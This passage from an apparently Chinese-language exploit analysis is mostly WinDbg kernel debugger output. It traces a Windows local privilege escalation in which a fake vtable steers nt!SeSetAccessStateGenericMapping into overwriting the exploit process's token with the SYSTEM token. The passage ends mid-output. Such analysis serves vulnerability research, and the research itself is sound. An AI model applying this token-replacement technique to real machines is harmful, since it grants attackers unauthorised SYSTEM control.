style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">38</span><span style="color:#ae81ff">14</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> .......<span style="color:#ae81ff">.8</span>.......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1468</span></span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de4d8<span style="color:#ae81ff">08</span> f0 fd c1<span style="color:#ae81ff">30</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">08</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#ae81ff">.0</span>...........</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de4e8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#ae81ff">38</span> bb<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ........<span style="color:#ae81ff">.8</span>......</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de4f8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de508<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de518<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de528<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de538<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0de548<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><p>查看此时的pContainer对象</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db bb3810</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3810<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3820<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3830<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3840<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3850<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3860<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3870<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span>bb3880<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">75</span> fe<span style="color:#ae81ff">91</span><span style="color:#ae81ff">83</span> b1 ff ff .......<span style="color:#ae81ff">.0</span>u......</span></span></code></pre></div><p>vtable</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq<span style="color:#ae81ff">5000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000000</span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">23456789</span> fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">15ff</span><span style="color:#ae81ff">2</span>da0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000010</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">13</span>a51cb0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000020</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000040</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000050</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000060</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">05000070</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>执行到nt!SeSetAccessStateGenericMapping函数时，rdx指向内存0xFFFFFFFF，该内存存储了system token的地址，将其写入到rax+8指向的地址中，此处为自身token地址，也就是将system token地址写入到了自身token地址中，即把自身token 替换成了system token达成提权。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>system权限token</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp rdx L6</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03e616</span>fc<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000000f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000001f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>process<span style="color:#ae81ff">4</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>Searching<span style="color:#66d9ef">for</span> Process with Cid<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span></span></span><span style="display:flex;"><span>PROCESS ffffb1838ce87180</span></span><span style="display:flex;"><span> SessionId: none Cid:<span style="color:#ae81ff">0004</span> Peb:<span style="color:#ae81ff">00000000</span> ParentCid:<span style="color:#ae81ff">0000</span></span></span><span style="display:flex;"><span> DirBase:<span style="color:#ae81ff">001</span>ad000 ObjectTable: ffff8e8603e57d40 HandleCount:<span style="color:#ae81ff">2731.</span></span></span><span style="display:flex;"><span> Image: System</span></span><span style="display:flex;"><span> VadRoot ffffb1838ce94920 Vads<span style="color:#ae81ff">6</span> Clone<span style="color:#ae81ff">0</span> Private<span style="color:#ae81ff">22.</span> Modified<span style="color:#ae81ff">4650.</span> Locked<span style="color:#ae81ff">0.</span></span></span><span style="display:flex;"><span> DeviceMap ffff8e8603e35ae0</span></span><span style="display:flex;"><span> Token ffff8e8603e616f0</span></span><span style="display:flex;"><span> ElapsedTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span><span style="color:#f92672">:</span><span style="color:#ae81ff">07.536</span></span></span><span style="display:flex;"><span> UserTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> KernelTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">03.093</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool]<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool]<span style="color:#ae81ff">272</span></span></span><span style="display:flex;"><span> Working Set<span style="color:#a6e22e">Sizes</span> (now,min,max) (<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">450</span>) (<span style="color:#ae81ff">196</span>KB,<span style="color:#ae81ff">200</span>KB,<span style="color:#ae81ff">1800</span>KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize<span style="color:#ae81ff">216</span></span></span><span style="display:flex;"><span> VirtualSize<span style="color:#ae81ff">3</span> Mb</span></span><span style="display:flex;"><span> PeakVirtualSize<span style="color:#ae81ff">14</span> Mb</span></span><span style="display:flex;"><span> PageFaultCount<span style="color:#ae81ff">2325</span></span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority<span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span> CommitCharge<span style="color:#ae81ff">49</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">当前权限</span>token</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>process<span style="color:#ae81ff">0x10cc</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>Searching<span style="color:#66d9ef">for</span> Process with Cid<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span>cc</span></span><span style="display:flex;"><span>PROCESS ffffb18391fe7080</span></span><span style="display:flex;"><span> SessionId:<span style="color:#ae81ff">1</span> Cid:<span style="color:#ae81ff">10</span>cc Peb: f894963000 ParentCid:<span style="color:#ae81ff">02</span><span style="color:#ae81ff">94</span></span></span><span style="display:flex;"><span> DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount:<span style="color:#ae81ff">92.</span></span></span><span style="display:flex;"><span> Image: exp.exe</span></span><span style="display:flex;"><span> VadRoot ffffb18392993580 Vads<span style="color:#ae81ff">57</span> Clone<span style="color:#ae81ff">0</span> Private<span style="color:#ae81ff">4686.</span> Modified<span style="color:#ae81ff">1209.</span> Locked<span style="color:#ae81ff">0.</span></span></span><span style="display:flex;"><span> DeviceMap ffff8e8608a9b1d0</span></span><span style="display:flex;"><span> Token ffff8e860bc6f770</span></span><span style="display:flex;"><span> ElapsedTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">54</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10.168</span></span></span><span style="display:flex;"><span> UserTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> KernelTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool]<span style="color:#ae81ff">123368</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool]<span style="color:#ae81ff">8096</span></span></span><span style="display:flex;"><span> Working Set<span style="color:#a6e22e">Sizes</span> (now,min,max) (<span style="color:#ae81ff">5602</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">345</span>) (<span style="color:#ae81ff">22408</span>KB,<span style="color:#ae81ff">200</span>KB,<span style="color:#ae81ff">1380</span>KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize<span style="color:#ae81ff">5529</span></span></span><span style="display:flex;"><span> VirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PeakVirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PageFaultCount<span style="color:#ae81ff">8565</span></span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority<span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span> CommitCharge<span style="color:#ae81ff">6285</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span> L2</span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7538 ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>bc6f774<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>继续执行，当前进程的Token已经被替换为系统Token</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span></span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">15ff</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dp ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7080<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4b8</span> L6</span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7538 ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03e616</span>fc<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7548<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb183<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">91f</span>e7558<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>process<span style="color:#ae81ff">0x10cc</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>Searching<span style="color:#66d9ef">for</span> Process with Cid<span style="color:#f92672">==</span><span style="color:#ae81ff">10</span>cc</span></span><span style="display:flex;"><span>PROCESS ffffb18391fe7080</span></span><span style="display:flex;"><span> SessionId:<span style="color:#ae81ff">1</span> Cid:<span style="color:#ae81ff">10</span>cc Peb: f894963000 ParentCid:<span style="color:#ae81ff">02</span><span style="color:#ae81ff">94</span></span></span><span style="display:flex;"><span> DirBase: a8104000 ObjectTable: ffff8e860b632980 HandleCount:<span style="color:#ae81ff">92.</span></span></span><span style="display:flex;"><span> Image: exp.exe</span></span><span style="display:flex;"><span> VadRoot ffffb18392993580 Vads<span style="color:#ae81ff">57</span> Clone<span style="color:#ae81ff">0</span> Private<span style="color:#ae81ff">4686.</span> Modified<span style="color:#ae81ff">1209.</span> Locked<span style="color:#ae81ff">0.</span></span></span><span style="display:flex;"><span> DeviceMap ffff8e8608a9b1d0</span></span><span style="display:flex;"><span> Token ffff8e8603e616f0</span></span><span style="display:flex;"><span> ElapsedTime<span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">41.537</span></span></span><span style="display:flex;"><span> UserTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> KernelTime<span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[PagedPool]<span style="color:#ae81ff">123368</span></span></span><span style="display:flex;"><span> QuotaPoolUsage[NonPagedPool]<span style="color:#ae81ff">8096</span></span></span><span style="display:flex;"><span> Working Set<span style="color:#a6e22e">Sizes</span> (now,min,max) (<span style="color:#ae81ff">5602</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">345</span>) (<span style="color:#ae81ff">22408</span>KB,<span style="color:#ae81ff">200</span>KB,<span style="color:#ae81ff">1380</span>KB)</span></span><span style="display:flex;"><span> PeakWorkingSetSize<span style="color:#ae81ff">5529</span></span></span><span style="display:flex;"><span> VirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PeakVirtualSize<span style="color:#ae81ff">4210</span> Mb</span></span><span style="display:flex;"><span> PageFaultCount<span style="color:#ae81ff">8565</span></span></span><span style="display:flex;"><span> MemoryPriority BACKGROUND</span></span><span style="display:flex;"><span> BasePriority<span style="color:#ae81ff">8</span></span></span><span style="display:flex;"><span> CommitCharge<span style="color:#ae81ff">6285</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>token ffff8e8603e616f0</span></span><span style="display:flex;"><span>_TOKEN<span style="color:#ae81ff">0xffff8e8603e616f0</span></span></span><span style="display:flex;"><span>TS Session ID:<span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>User: S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">18</span></span></span><span style="display:flex;"><span>User Groups:</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5</span><span style="color:#f92672">-</span><span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">544</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> Default Enabled Owner</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> S<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span> Attributes<span style="color:#f92672">-</span> Mandatory Default Enabled</span></span><span 